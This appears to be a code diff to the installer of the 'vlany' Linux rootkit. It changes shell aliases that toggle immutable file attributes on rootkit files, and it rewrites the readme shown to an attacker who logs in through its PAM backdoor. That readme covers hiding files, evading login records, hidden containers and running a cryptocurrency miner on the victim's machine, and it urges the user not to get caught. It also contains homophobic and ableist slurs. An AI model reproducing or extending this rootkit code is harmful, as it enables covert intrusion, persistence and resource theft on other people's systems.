@@ -369,8 +369,7 @@ alias emerge=apt-get
 alias pacman=apt-get
 
 alias unchattr='cd {0}; chattr -ia .* * &>/dev/null; echo "chattr permissions removed on rootkit files"'
-alias rechattr='cd {0}; chattr +ia .* * &>/dev/null; echo "rootkit files chattr permissions reinstated"'
-alias exit='cd {0}; echo "Exiting vlany PAM backdoor in 5 seconds. ^C to cancel."; sleep 5; chattr +ia .* * &>/dev/null; exit;'"""
+alias rechattr='cd {0}; chattr +ia .* * &>/dev/null; echo "rootkit files chattr permissions reinstated"'"""
     fd = open("bashrc", "w")
     fd.write(bash_rc.format(INSTALL))
     fd.close()
@@ -389,7 +388,7 @@ alias exit='cd {0}; echo "Exiting vlany PAM backdoor in 5 seconds. ^C to cancel.
         (rootkit for homosexuals)
 
 If you're reading this, then you've successfully logged into your PAM backdoor and you are in an owner shell. Now that you've started reading this, there's a few things you should know.
-vlany is a rootkit which tries very hard to remain hidden and secure. DO NOT unnecessarily risk the anonymity of this rootkit. For now, it is an unknown rootkit. Keep it that way, mk?
+vlany is now a public rootkit! Thanks for using me, it means a lot. Enjoy, and try not to get caught. :p
 By default, vlany attempts to prevent you from unhiding yourself to a certain extent, but you can easily get past that, since you ARE in an owner shell after all. Be careful if you're going to do something potentially dumb.
 DO NOT unalias apt-get and attempt to install a package via the standard package manager on this box. EVERYTHING WILL GO TO RUIN.
 There's a vlany command for installing packages via apt-get. To use it, enter "./apt" followed by your execve password.
@@ -401,6 +400,7 @@ BIG GAY WARNING:
     FOR THIS REASON, IT IS ONLY POSSIBLE TO INSTALL ONE PACKAGE AT A TIME. TRY NOT TO INSTALL PACKAGES THAT WILL TAKE MORE THAN 1 MINUTE TO INSTALL.
     BE CAREFUL.
     YOU HAVE BEEN WARNED.
+    THIS APPLIES FOR ANY PROCESSES WHICH TEMPORARILY CHANGE YOUR GID.
 
 A breakdown of how the command works:
     cd to root
@@ -419,9 +419,6 @@ File hiding/protection:
     ONCE YOU CREATE NEW FILES OR DIRECTORIES, YOU MUST ISSUE THE ./hide COMMAND ON THE NEWLY CREATED FILES/DIRECTORIES TO
     PROTECT THEM FROM REGULAR USERS. THIS IS VERY IMPORTANT. DO NOT FORGET THIS.
     ld.so.preload and your hidden directory are by default, already fully protected.
-
-utmp/wtmp hiding:
-    You are hidden from /var/log/wtmp and /var/run/utmp, however the name of your current tty may show up. I wouldn't worry about this TOO much, but there's a very small chance some paranoid sysadmin MAY look into this.
 
 vlany LXC container:
   There's a file called enter_lxc.c in your home directory. It allows for on-the-fly creation and destruction of hidden container environments.
@@ -448,10 +445,7 @@ Bitcoin/Litecoin miner:
   TRYING TO SETUP YOUR MINER WITHOUT THESE PACKAGES INSTALLED WILL FUCK UP THE SETUP PROCESS. DON'T BE RETARDED.
   Once you've compiled the miner, start it with ./minerd_bin --url=minerpool.org --user=username --pass=password
 
-Exiting this shell:
-  If you've removed the chattr permissions on the files inside your home directory, you must either exit with 'exit', or by reinstating the chattr permissions first before force exiting.
-
-Read this AT LEAST twice, when you're done, quit this screen with :q. This screen will not show again after this."""
+Read this AT LEAST twice, when you're done, quit this screen by pressing q. This screen will not show again after this."""
 
     fd = open("bd_readme", "w")
     fd.write(BD_README)
